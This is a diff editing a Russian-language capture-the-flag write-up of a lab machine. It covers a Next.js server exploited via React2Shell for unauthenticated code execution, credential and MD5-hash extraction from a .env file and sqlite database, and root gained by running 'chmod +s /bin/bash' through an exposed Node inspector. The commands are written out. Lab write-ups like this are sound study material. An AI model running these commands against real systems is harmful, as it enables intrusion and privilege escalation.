@@ -42,41 +42,6 @@ PORT     STATE SERVICE VERSION
 |   Help, NCP, RPCCheck: 
 |     HTTP/1.1 400 Bad Request
 |_    Connection: close
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port3000-TCP:V=7.95%I=7%D=9/9%Time=6AA1E81C%P=x86_64-pc-linux-gnu%r(Get
-SF:Request,1518,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
-SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
-SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
-SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
-SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
-SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
-SF:75\r\nDate:\x20Wed,\x2009\x20Sep\x202026\x2023:13:32\x20GMT\r\nConnecti
-SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
-SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
-SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
-SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
-SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
-SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
-SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
-SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
-SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
-SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
-SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
-SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
-SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
-SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
-SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Wed,\
-SF:x2009\x20Sep\x202026\x2023:13:32\x20GMT\r\nConnection:\x20close\r\n\r\n
-SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
-SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
-SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
-SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
-SF:nDate:\x20Wed,\x2009\x20Sep\x202026\x2023:13:32\x20GMT\r\nConnection:\x
-SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
-SF:Connection:\x20close\r\n\r\n");
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
 
 Вижу что висит Next.js, захожу туда и вижу вот ето...
 
@@ -86,6 +51,8 @@ Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
 но пришел к мысли о том что бы посмотреть какие последние уязвимости есть у Next.js на котором как раз висит приложение , ну наткнулся на известный React2Shell - CVE-2025-66478  
 перед поиском експлоита я решаюсь посмотреть что же вообще такое CVE-2025-66478 и как он используется. Так, ну что, если коротко - эта уязвимость которая дает нам RCE без аутентификации - CVSS 10.0
 по факту это дубликат CVE-2025-55182 просто зарегали ее дважды, из-за чего кстати на NVD ее пометили как Rejected 
+
+# React2Shell CVE-2025-55182/CVE-2025-66478
 
 Как же работает React2Shell?
 1. Мы формируем наш вредоносный HTTP запрос - уязвимость заключается в том, как протокол React Server Components десериализует пользовательский ввод на сервер
@@ -104,12 +71,10 @@ node@reactor:/opt/reactor-app$
 мы получили rce
 
 
-Дальше мы хотим повысить свои привилегии. 
+# Повышение привилегий до engineer
 
 node@reactor:/opt/reactor-app$ cat .env
 cat .env
-# ReactorWatch Configuration
-# Database connection for sensor data
 
 DB_PATH=/opt/reactor-app/reactor.db
 DB_TYPE=sqlite3
@@ -117,21 +82,27 @@ DB_TYPE=sqlite3
 # API Keys
 SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
 ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
-
-# Node environment
 NODE_ENV=production
 
-
+# sqlite3
 вижу sqlite3 решаю зайти туда и посмотреть какие .tables есть 
 
 sqlite> .tables
+
 sensor_logs  users      
+
 sqlite> select * from users
+
    ...> ;
+   
 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+
 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+
 sqlite> 
+
 круто, это md5, перед взломом через john/hashcat я реши зайти на сайт https://hashes.com/ и декриптнуть его там
+
 39d97110eafe2a9a68639812cd271e8e:reactor1
 
 
@@ -143,29 +114,32 @@ user.txt
 engineer@reactor:~$ cat user.txt 
 ???????????????????????????????????
 
-
+# Повышение привилегий до root
 engineer@reactor:~$ id
 uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
 
 я пытался получить рута от lxd но все было безуспешно, так как его на самом деле там и нет(
-вообщем попробую linpeas
-он тоже не особо что то выдал, кроме как уязвимостей ядра, lpe через пвнкит слишком просто да и это не тот вектор
+вообщем попробую linpeas.sh
 по итогу я нашел процесс который запущен от root 1419  0.0  1.2 1066836 47892 ?       Ssl  Sep09   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
 подключился engineer@reactor:/opt/uptime-monitor$ node inspect 127.0.0.1:9229
 connecting to 127.0.0.1:9229 ... ok
 debug> exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash')")
 Uint8Array(0)
 debug> .exit
-engineer@reactor:/opt/uptime-monitor$ ls -la /bin/bash
--rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
-engineer@reactor:/opt/uptime-monitor$ /bin/bash -p
-bash-5.2# id
-uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)
-bash-5.2# cat /root/root.txt
-?????????????????????????????????
-bash-5.2# 
-вот и все
 
+engineer@reactor:/opt/uptime-monitor$ ls -la /bin/bash
+
+-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+engineer@reactor:/opt/uptime-monitor$ /bin/bash -p
+
+bash-5.2# id
+
+uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)
+
+bash-5.2# cat /root/root.txt
+
+?????????????????????????????????
 
 
 
